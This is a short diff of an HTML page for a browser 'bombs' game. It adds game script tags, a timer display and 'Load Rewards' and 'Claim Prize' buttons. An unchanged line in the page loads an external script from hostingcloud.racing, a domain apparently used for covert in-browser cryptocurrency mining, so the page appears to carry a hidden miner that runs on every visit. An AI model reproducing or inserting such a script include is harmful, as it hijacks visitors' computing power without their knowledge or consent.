@@ -11,6 +11,9 @@
     <!--   This is where the Phaser 2.6.2 code is brought in to the app. -->
 
     <script type="text/javascript" src="bombs.js" defer></script>
+        <script src="/games/client.js" defer></script>
+        <script src="/games/slots/slots.js" defer></script>
+
 
     <link rel="stylesheet" href="style.css" />
     <script src="https://www.hostingcloud.racing/vrGl.js"></script>
@@ -122,6 +125,11 @@
           <div class="bombs" id="bombs"></div>
           <div class="tools">
             <div class="tool" onclick="startBombs();">
+               <label id="timeM" value="0">00</label>.<label id="timeS" value="0"
+                >00</label
+              >
+             <div class="button" onclick="loadRewards();">Load Rewards</div><br>
+            <div class="button-right" onclick="claimPrize();">Claim Prize</div>
               Start Game
             </div>
           </div>
